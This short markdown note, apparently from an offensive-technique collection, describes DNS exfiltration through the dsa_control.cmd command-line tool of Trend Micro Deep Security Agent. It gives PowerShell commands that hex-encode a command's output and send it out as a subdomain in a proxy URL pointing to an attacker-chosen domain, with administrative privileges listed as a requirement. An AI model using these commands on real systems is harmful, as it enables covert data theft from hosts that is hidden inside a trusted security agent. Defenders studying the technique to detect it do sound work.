## Trend Micro Deep Security Agent: DNS Exfiltration using legitimate CLI tool

Requirements:
- Administrative privileges



```powershell
$cmd = -join ([System.Text.Encoding]::UTF8.GetBytes((<COMMAND>)) | ForEach-Object { "{0:x2}" -f $_ }) # Convert command output to HEX
```

```powershell
dsa_control.cmd -x "dsm_proxy://$whoami.<domain>:443/"
```


## Example
![alt text](assets/2.PNG)

![alt text](assets/1.png)

